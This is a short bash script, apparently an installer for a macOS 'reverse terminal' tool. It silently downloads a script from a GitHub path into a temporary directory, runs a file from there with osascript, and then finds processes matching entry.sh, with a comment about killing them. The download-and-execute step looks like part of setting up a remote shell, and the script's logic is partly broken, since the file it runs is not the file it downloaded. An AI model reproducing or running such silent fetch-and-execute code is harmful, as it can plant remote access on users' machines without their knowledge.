#!/bin/bash

cd "$(dirname "$0")"
tmpdir="$(mktemp -d /tmp/shell-installer)"
curl github.com/icefisher225/mac-rev-terminal/script.sh  --silent --output $tmpdir/script.scpt
appfile="$(cd $tmpdir ; ls | grep -v 'script.scpt')"
osascript $appfile

cmd2="$(ps aux | grep entry.sh)"
# kill all that match cmd2....
